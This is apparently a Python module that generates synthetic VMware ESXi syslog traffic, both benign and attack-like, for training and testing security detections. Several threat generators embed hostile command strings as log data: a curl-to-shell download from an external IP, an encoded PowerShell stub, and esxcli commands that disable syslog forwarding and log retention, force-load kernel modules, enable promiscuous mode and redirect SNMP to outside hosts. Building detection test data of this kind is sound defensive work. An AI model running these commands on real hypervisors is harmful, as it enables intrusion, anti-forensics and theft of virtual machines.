    (_b_shell_login,         9, True),   # SSH / ESXi Shell / DCUI logins + logouts
    (_b_config_change,       7, True),   # advanced settings / lockdown / NTP / fw / role
    (_b_vm_lifecycle,        6, True),   # create/clone/reconfigure/vMotion/snapshot
    (_b_ssh_service_toggle,  5, True),   # SSH / ESXi Shell enabled + disabled
    (_b_vsphere_session,     5, True),   # vSphere Client / API login + logout
    (_b_ha_drs,              5, False),  # vSphere HA (fdm) + DRS load-balancing
    (_b_service_control,     4, False),  # service restart / cert renew / NTP / ruleset
    (_b_service_health,      4, False),
    (_b_backup_job,          4, False),  # nightly snapshot + NFC read + remove
    (_b_account_admin,       4, True),   # create/disable/delete/lockout/password/role
    (_b_service_policy,      3, True),   # service startup policy + start/stop/restart
    (_b_storage,             3, False),
    (_b_datastore_ops,       3, False),  # rescan / NFS mount / capacity / grow / ISO upload
    (_b_guest_ops,           3, False),  # VMware Tools guest ops (baseline for guest_ops_exec)
    (_b_stale_account_login, 3, False),  # login attempts vs disabled + deleted accounts
    (_b_snapshot,            3, False),
    (_b_maintenance_mode,    3, True),
    (_b_patch_activity,      2, True),   # signed VIB install / image-profile scan
    (_b_crond,               3, False),
    (_b_envoy,              10, False),  # envoy reverse proxy: Host Client / SDK / loopback
]


def _benign(config, session_context=None):
    host = random.choice(_hosts(config))
    # Business-hours gate: human admin / config-change / login events cluster in work
    # hours; machine events (poll, kernel, vCenter sync, backup, cron) run around the
    # clock and dominate off-hours. activity_weight() is the shared org-time curve.
    if random.random() > activity_weight():
        pool = [(f, w) for f, w, human in _BENIGN_MIX if not human]
    else:
        pool = [(f, w) for f, w, human in _BENIGN_MIX]
    fns = [f for f, _ in pool]
    weights = [w for _, w in pool]
    fn = random.choices(fns, weights=weights, k=1)[0]
    return fn(config, host, session_context)


# ── Threat generators ─────────────────────────────────────────────────────────

def _ssh_brute_force(config, session_context=None):
    """A burst of failed SSH authentications from one external host, then (usually) a
    final success — the classic ESXi SSH brute-force / ransomware-foothold pattern. Each
    attempt logs ESXi 8's full failure set (pam auth failure, 'error: PAM: Authentication
    failure for <u> from <ip>', vobd triple, hostd 'SSH login has failed')."""
    host = random.choice(_hosts(config))
    attacker = rare_external_ip()
    users = ["root", "administrator", "admin", "root", "root", "vmware"]
    logs = []
    for _ in range(random.randint(12, 25)):
        u = random.choice(users)
        logs += _ssh_auth_failure(config, host, u, attacker, invalid=u != "root")
    # A foothold most of the time: the brute force lands.
    if random.random() < 0.7:
        logs += _ssh_session_open(config, host, "root", attacker)
    return logs


def _root_login_rare_source(config, session_context=None):
    """Successful root logon to the host's API / Host Client from a rare external source
    — anomalous first interactive access. hostd records the HaSessionManager accept and
    the 'logged in as <agent>' event with the client IP."""
    host = random.choice(_hosts(config))
    agent = random.choice([_BROWSER_UA, "pyvmomi Python/3.11.9 (Linux; 6.8.0; x86_64)"])
    return _api_login(config, host, "root", rare_external_ip(), agent=agent)


def _ssh_service_enabled(config, session_context=None):
    """ESXi Shell / SSH turned on and then used from outside — a near-universal step in
    ESXi ransomware intrusions. The attacker signs in to the Host Client from an external
    address, enables SSH (often the ESXi Shell too), and opens an SSH session as root
    from the same address. (Admins toggle SSH routinely from the admin network; the
    external SSH session right after the enable is what sets this apart.)"""
    host = random.choice(_hosts(config))
    src = rare_external_ip()
    sid = _sid(f"{host}|root|{src}")
    logs = _api_login(config, host, "root", src, sid=sid)
    logs += _service_toggle_lines(config, host, "root", "SSH", True)
    if random.random() < 0.5:
        logs += _service_toggle_lines(config, host, "root", "ESXi Shell", True)
    logs += _ssh_session_open(config, host, "root", src)
    return logs


def _local_account_created(config, session_context=None):
    """A new local account added from the host shell and granted the Administrator role
    — persistence / privilege. The shell command, hostd's API trace, the createUser task,
    and the account / permission events all name the same operator."""
    host = random.choice(_hosts(config))
    new_user = random.choice(["support", "vmsvc2", "helpdesk", "backupsvc", "svc_adm"])
    pid = random.randint(4200000, 4400000)
    add = f"esxcli system account add -i {new_user} -d svc -p '*****' -c '*****'"
    perm = f"esxcli system permission set -i {new_user} -r Admin"
    op_add = f"esxcli-system.account.add-{random.randint(0, 0xff):02x}-{random.randint(0, 0xffff):04x}"
    op_perm = f"esxcli-system.permission.set-{random.randint(0, 0xff):02x}-{random.randint(0, 0xffff):04x}"
    return ([_cmd_line(config, host, add, pid=pid)] + _cli_trace(config, host, add)
            + _task_lines(config, host, "ha-folder-root", "host.LocalAccountManager.createUser",
                          opid=op_add, user="root")
            + [_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {_ev(host)} : Account {new_user} was created on host {host}",
                           opid=op_add, user="root"),
               _cmd_line(config, host, perm, pid=pid)] + _cli_trace(config, host, perm)
            + [_hostd_line(config, host, "info", "Vimsvc.ha-eventmgr",
                           f"Event {_ev(host)} : Permission created for {new_user} on root, "
                           f"role is Administrator, propagation is Enabled",
                           opid=op_perm, user="root")])


def _mass_vm_power_off(config, session_context=None):
    """Many VMs powered off / snapshots removed in a short window from one Host Client
    session — the destructive stage of an ESXi ransomware event."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.5)
    sid = _sid(f"{host}|{actor}|{src}")
    logs = _api_login(config, host, actor, src, sid=sid)
    vms = _vms(config)[:]
    random.shuffle(vms)
    for vm in vms[:random.randint(4, len(vms))]:
        logs += _vm_power_lines(config, host, vm, "powerOff", user=actor, sid=sid)
        if random.random() < 0.5:
            logs += _task_lines(config, host, _vm_id(config, vm),
                                "VirtualMachine.removeAllSnapshots", opid=_opid(), user=actor, sid=sid)
    return logs


def _remote_syslog_disabled(config, session_context=None):
    """Remote syslog forwarding turned off from the host shell — defense evasion /
    anti-forensics. By definition the last ESXi event before the host goes dark to the
    collector: the esxcli command, its hostd trace, and the logHost option change."""
    host = random.choice(_hosts(config))
    logs = _shell_cmds(config, host, ["esxcli system syslog config set --loghost=''"])
    logs.append(_hostd_line(config, host, "info", "Vimsvc",
                            'Set called with key "Syslog.global.logHost", value ""',
                            opid=_opid("esxcli"), user="root"))
    logs += _shell_cmds(config, host, ["esxcli system syslog reload"])
    return logs


def _vm_disk_export(config, session_context=None):
    """VM disk / config downloaded off the datastore through the Host Client datastore
    browser — VM theft (exfiltration of whole guests). The /folder GET names the user;
    the 'File download from path' event names the client as '<agent>@<ip>'."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.5)
    ds = random.choice(_datastores(config))
    logs = _api_login(config, host, actor, src)
    for vm in random.sample(_vms(config), k=random.randint(2, 4)):
        ext = random.choice(["-flat.vmdk", ".vmdk", ".vmx", ".nvram"])
        logs += _datastore_transfer(config, host, "download", ds, f"{vm}/{vm}{ext}", actor, src,
                                    _BROWSER_UA)
    return logs


def _uncommon_host_command(config, session_context=None):
    """Interactive ESXi shell running UNCOMMON admin/discovery/evasion/destructive
    commands — the direct trigger for 'Uncommon command executed on a virtualization
    host' / 'Uncommon command was executed on a device'. Draws from the rare pool; the
    benign shell_command / crond events supply the common-command training baseline."""
    host = random.choice(_hosts(config))
    cmds = []
    for cmd in random.sample(_RARE_COMMANDS, k=random.randint(2, 4)):
        cmds.append(cmd % rare_external_ip() if "%s" in cmd else cmd)
    return _shell_cmds(config, host, cmds, start=random.random() < 0.5)


def _vuln_scan(config, session_context=None):
    """A vulnerability scanner / automated recon tool probing the host's management
    surface from one external IP — the enumeration-plus-login-probe pattern (Nessus /
    Qualys / OpenVAS / opportunistic internet scan). Spans the services a scanner hits:
      envoy       many short requests to /sdk /mob /ui /folder and junk paths, mostly
                  4xx or proxy-rejected.
      sshd        pre-auth noise — no identification string, pre-auth closes, no matching
                  kex — plus a few default-credential login attempts.
      hostd       rejected API logins (default creds against the SOAP endpoint).
    Non-analytic for VMware syslog (no command runs on the host), but a strong hunting /
    cross-source correlation signal — the same scanner IP lights up the firewall too."""
    host = random.choice(_hosts(config))
    scanner = rare_external_ip()
    endpoints = [("GET", "/sdk/vimServiceVersions.xml", 200), ("GET", "/mob", 401),
                 ("GET", "/ui/", 200), ("GET", "/folder", 401), ("POST", "/sdk", 500),
                 ("GET", "/cgi-bin/esxupdate", 404), ("GET", "/.env", 404),
                 ("GET", "/ticket/../../etc/passwd", 400), ("GET", "/host", 401)]
    default_users = ["root", "root", "admin", "administrator", "vmware", "dcui"]
    logs = []
    for _ in range(random.randint(14, 26)):
        kind = random.choices(["http", "ssh_preauth", "ssh_login", "api_login"],
                              weights=[46, 22, 12, 20], k=1)[0]
        port = random.randint(30000, 65000)
        client = f"{scanner}:{port}"
        if kind == "http":
            method, path, status = random.choice(endpoints)
            if status in (400, 404):
                logs.append(_envoy_line(config, host, method, path, status, client,
                                        flags="route_not_found" if status == 404 else "-",
                                        tx=random.randint(0, 200)))
            else:
                logs.append(_envoy_line(config, host, method, path, status, client,
                                        upstream="127.0.0.1:8307" if path.startswith("/sdk") else "127.0.0.1:8309"))
        elif kind == "ssh_preauth":
            logs.append(_sshd_line(config, host, random.choice([
                f"Did not receive identification string from {scanner} port {port}",
                f"Connection closed by {scanner} port {port} [preauth]",
                f"Unable to negotiate with {scanner} port {port}: no matching key exchange method found.",
                f"banner exchange: Connection from {scanner} port {port}: invalid format",
            ])))
        elif kind == "ssh_login":
            u = random.choice(default_users)
            logs += _ssh_auth_failure(config, host, u, scanner, invalid=u != "root")
        else:  # api_login — SOAP login with default creds, rejected
            u = random.choice(default_users)
            logs.append(_envoy_line(config, host, "POST", "/sdk", 500, client,
                                    upstream="127.0.0.1:8307"))
            logs.append(_hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
                                    f"Event {_ev(host)} : Cannot login {u}@{scanner}"))
    return logs


# ── Top-tier custom-rule targets ───────────────────────────────────────────────
# No shipped XSIAM analytic covers these, but each has clear log evidence and is a
# strong manual correlation / BIOC target. Where a benign counterpart exists (guest ops,
# datastore upload, disk add, planned reboot, portgroup Reject), the rule has a baseline
# to stand out against.

def _guest_ops_exec(config, session_context=None):
    """Guest Operations (VIX) API abuse — programs/files pushed INTO guest VMs from the
    management plane (hypervisor -> guest execution / lateral movement). hostd logs the
    guest-op invocation with the in-guest auth and the program/file."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.4)
    logs = []
    for vm in random.sample(_vms(config), k=random.randint(2, 4)):
        op = random.choice([
            "StartProgramInGuest: guestAuth=Administrator program='C:\\Windows\\System32\\"
            "cmd.exe /c powershell -enc JABzAD0A...'",
            f"StartProgramInGuest: guestAuth=root program='/bin/sh -c curl http://{rare_external_ip()}/x|sh'",
            "InitiateFileTransferToGuest: guestAuth=root path='/tmp/.x/implant' size="
            f"{random.randint(10**5, 10**7)}",
            "ListProcessesInGuest: guestAuth=Administrator",
        ])
        logs.append(_hostd_line(config, host, "info", _vmx_sub(config, vm),
                    f"Guest operation {op} on vm={vm} invoked by {actor}@{src}",
                    opid=_opid(), user=actor))
    return logs


def _datastore_upload(config, session_context=None):
    """Suspicious file UPLOAD to a datastore through the Host Client datastore browser —
    staging a webshell / ELF / script / rogue ISO on shared storage. The upload
    counterpart to vm_disk_export; the benign ISO/template upload by svc_vcenter in
    _b_datastore_ops is the baseline."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.5)
    ds = random.choice(_datastores(config))
    logs = _api_login(config, host, actor, src)
    for _ in range(random.randint(1, 3)):
        fn = random.choice([".sshdoor/implant.sh", ".hidden/encryptor", "x.py",
                            "webshell.php", "tools/nc", "ISO/rogue-boot.iso"])
        logs += _datastore_transfer(config, host, "upload", ds, fn, actor, src, _BROWSER_UA)
    return logs


def _vm_disk_attach(config, session_context=None):
    """A VM reconfigured to attach ANOTHER VM's virtual disk — offline data theft (mount a
    DC / vault VM's -flat.vmdk onto a scratch VM to read it raw, bypassing the guest OS)."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context)
    vms = _vms(config)[:]
    random.shuffle(vms)
    victim = vms[0]
    attacker_vm = vms[1] if len(vms) > 1 else "scratch-vm"
    ds = random.choice(_datastores(config))
    return [_hostd_line(config, host, "info", _vmx_sub(config, attacker_vm),
            f"Reconfigured {attacker_vm} on {host} in ha-datacenter: added existing disk "
            f"/vmfs/volumes/{ds}/{victim}/{victim}-flat.vmdk (mode independent-nonpersistent) "
            f"by {actor}@{src}", opid=_opid(), user=actor)]


def _kernel_module_load(config, session_context=None):
    """Loading a non-standard / unsigned VMkernel module — rootkit / backdoor staging
    (VIRTUALPITA-style). esxcli module load from the shell + a vmkwarning for a module
    outside the shipped signed set."""
    host = random.choice(_hosts(config))
    mod = random.choice(["vmwdbg", "nsx-shim", "vmkmgmt_hook", "procfs_hook", "hostd_aux"])
    return (_shell_cmds(config, host, [f"esxcli system module load -m {mod} --force"])
            + [_vmkernel_line(config, host, "Mod",
                              f"Loaded module {mod} from /tmp/.x/{mod}.ko (not in VMware signed set)",
                              severity="warning")])


def _promiscuous_mode(config, session_context=None):
    """A port group's security policy set to ACCEPT promiscuous mode / forged transmits /
    MAC changes from the shell — a virtual network tap for sniffing guest traffic. ESXi 8
    logs no event for this; the esxcli command and its hostd dispatch are the record. The
    benign baseline (_b_config_change) only ever sets these to false."""
    host = random.choice(_hosts(config))
    pg = random.choice(_PORTGROUPS)
    opt = random.choice(["--allow-promiscuous", "--allow-forged-transmits", "--allow-mac-change"])
    return _shell_cmds(config, host, [
        f'esxcli network vswitch standard portgroup policy security set -p "{pg}" {opt}=true'])


def _unplanned_reboot(config, session_context=None):
    """Host reboot / shutdown with no maintenance-mode window — ransomware rebooting into
    its payload, or a disruptive availability action (VMs not cleanly stopped)."""
    host = random.choice(_hosts(config))
    actor, src = _resolve_admin(config, session_context, external=random.random() < 0.4)
    act = "reboot" if random.random() < 0.6 else "shutdown"
    verb = "rebooted" if act == "reboot" else "shut down"
    return [
        _hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
            f"Event {_ev(host)} : Host {host} is being {verb} by "
            f"{actor}@{src} (host not in maintenance mode)", opid=_opid(), user=actor),
        _vmkernel_line(config, host, "Reboot",
            f"User-initiated {act}; {random.randint(1, 40)} running VMs were not cleanly "
            f"powered off", severity="warning"),
    ]


def _snmp_external_target(config, session_context=None):
    """SNMP enabled from the shell with its trap target set to an EXTERNAL host — turning
    host telemetry into an exfil / C2 channel."""
    host = random.choice(_hosts(config))
    ext = rare_external_ip()
    return _shell_cmds(config, host, [f"esxcli system snmp set -e true -c public -t {ext}@162/public"])


def _log_rotation_disabled(config, session_context=None):
    """Syslog rotation neutered (size/rotate 0) and the log dir redirected to the /tmp
    ramdisk from the shell — anti-forensics that keeps the host 'logging' while nothing
    is retained."""
    host = random.choice(_hosts(config))
    return _shell_cmds(config, host, [
        "esxcli system syslog config logger set -i hostd --size 0 --rotate 0",
        "esxcli system syslog config set --logdir=/tmp",
    ])


def _config_harvest(config, session_context=None):
    """One shell session pulling the whole host configuration in a burst — scripted recon
    / config harvesting (many esxcli / vim-cmd get/list in seconds)."""
    host = random.choice(_hosts(config))
    reads = ["esxcli system settings advanced list", "esxcli network firewall ruleset list",
             "esxcli system account list", "esxcli system permission list",
             "vim-cmd vmsvc/getallvms", "esxcli storage filesystem list",
             "esxcli network ip interface list", "esxcli system snmp get",
             "vim-cmd hostsvc/hostsummary", "esxcli software vib list"]
    return _shell_cmds(config, host, random.sample(reads, k=random.randint(6, len(reads))),
                       start=True)


def _permission_denied_burst(config, session_context=None):
    """Repeated authorization failures for one identity across operations — privilege
    mapping / recon by a low-priv or stolen account."""
    host = random.choice(_hosts(config))
    user, src = _resolve_admin(config, session_context)
    ops = ["HostConfigManager.firewallSystem", "AccountManager.createUser",
           "HostStorageSystem.rescanAllHba", "HostServiceSystem.startService",
           "DatastoreBrowser.deleteFile", "HostNetworkSystem.updatePortGroup"]
    logs = []
    for _ in range(random.randint(6, 12)):
        logs.append(_hostd_line(config, host, "warning", "Vimsvc.ha-eventmgr",
            f"Event {_ev(host)} : Permission to perform this operation "
            f"was denied for user {user}@{src} on {random.choice(ops)}", opid=_opid(), user=user))
    return logs


_THREAT_FUNCS = {
    "uncommon_host_command": _uncommon_host_command,
    "vuln_scan": _vuln_scan,
    "ssh_brute_force": _ssh_brute_force,
    "root_login_rare_source": _root_login_rare_source,
    "ssh_service_enabled": _ssh_service_enabled,
    "local_account_created": _local_account_created,
    "mass_vm_power_off": _mass_vm_power_off,
    "remote_syslog_disabled": _remote_syslog_disabled,
    "vm_disk_export": _vm_disk_export,
    "guest_ops_exec": _guest_ops_exec,
    "datastore_upload": _datastore_upload,
    "vm_disk_attach": _vm_disk_attach,
    "kernel_module_load": _kernel_module_load,
    "promiscuous_mode": _promiscuous_mode,
    "unplanned_reboot": _unplanned_reboot,
    "snmp_external_target": _snmp_external_target,
    "log_rotation_disabled": _log_rotation_disabled,
    "config_harvest": _config_harvest,
    "permission_denied_burst": _permission_denied_burst,
}


def _generate_threat_log(config, session_context, forced_event=None):
    """Returns (log_content, event_name) so the dashboard counts the threat. The caller
    (generate_log) passes this through unchanged; record_log increments total_threats
    once per event when event_name is in get_threat_names(). Returning bare logs here
    (the earlier bug) left event_name None, so the threat counter never moved."""
    if forced_event:
        fn = _THREAT_FUNCS.get(forced_event)
        return (fn(config, session_context), forced_event) if fn else None
    events = [t["event"] for t in _THREATS]
    weights = [t["weight"] for t in _THREATS]
    choice = random.choices(events, weights=weights, k=1)[0]
    return (_THREAT_FUNCS[choice](config, session_context), choice)


def _get_threat_interval(threat_level, config):
    """Seconds between threat events for *threat_level*. config.json maps each level
    directly to an int of seconds (e.g. "Realistic": 7200); tolerate a {"seconds": N}
    shape too in case the schema ever changes."""
    val = config.get("threat_generation_levels", {}).get(threat_level, 0)
    if isinstance(val, dict):
        val = val.get("seconds", 0)
    try:
        return float(val)
    except (TypeError, ValueError):
        return 0


def generate_log(config, scenario=None, threat_level="Realistic", benign_only=False,
                 context=None, scenario_event=None):
    """Main entry point. Returns a single syslog string or a list of strings
    (multi-line threats). Transport is syslog (config vmware_esxi_config.syslog_port)."""
    global last_threat_event_time
    session_context = (context or {}).get("session_context")

    # Orchestrator / dashboard scenario override.
    if scenario:
        scenario_event = scenario if isinstance(scenario, str) else scenario.get("name", "")
    if scenario_event:
        return _generate_threat_log(config, session_context, forced_event=scenario_event)

    if benign_only:
        return _benign(config, session_context)

    interval = _get_threat_interval(threat_level, config)
    now = time.time()

    if threat_level == "Insane" and random.random() < 0.8:
        return _generate_threat_log(config, session_context)

    if interval > 0 and (now - last_threat_event_time) > interval:
        last_threat_event_time = now
        return _generate_threat_log(config, session_context)

    return _benign(config, session_context)
